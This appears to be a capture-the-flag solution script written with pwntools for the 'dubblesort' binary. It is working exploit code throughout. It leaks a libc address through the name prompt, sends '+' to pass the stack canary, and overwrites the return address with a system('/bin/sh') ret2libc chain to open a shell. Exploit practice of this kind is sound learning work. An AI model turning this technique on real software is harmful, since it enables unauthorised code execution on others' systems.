#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf  = ELF('./dubblesort')
libc = ELF('/usr/lib32/libc-2.32.so')

# Memory locations
bin_sh = elf.bss() + 0x100

# Byte sequence alias
A4 = 4 * b'A'


def main():
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    # Develop your exploit here
    proc.recvuntil('What your name :')
    proc.send(A4 * 4)

    proc.recvuntil('Hello ' + 'AAAA' * 4)
    libc__exit_funcs_lock = u32(proc.recv(4))
    libc_base = libc__exit_funcs_lock - libc.sym['__exit_funcs_lock']
    libc_system = libc_base + libc.sym['system']
    libc_bin_sh = libc_base + list(libc.search(b'/bin/sh'))[0]

    log.info('__exit_funcs_lock@libc: {}'.format(hex(libc__exit_funcs_lock)))
    log.info('libc base: {}'.format(hex(libc_base)))
    log.info('system@libc: {}'.format(hex(libc_system)))
    log.info('bin_sh@libc: {}'.format(hex(libc_bin_sh)))

    proc.recvuntil('sort :')
    proc.sendline(str(35).encode())


    payload = []
    for i in range(32):
        payload.append(0x30678 if i < 24 else 0xf0000000)
    payload.append(libc_system)  # ret
    payload.append(libc_bin_sh)  # system()'s ret addr
    payload.append(libc_bin_sh)  # system()'s 1st arg

    for i in range(35):
        proc.recvuntil('number : ')
        if i == 24:
            proc.sendline(b'+')
        else:
            proc.sendline(str(payload[i]).encode())

    # canary:  0xffa7fcfc ◂— 0x23c04d00
    proc.interactive()


if __name__ == '__main__':
    main()
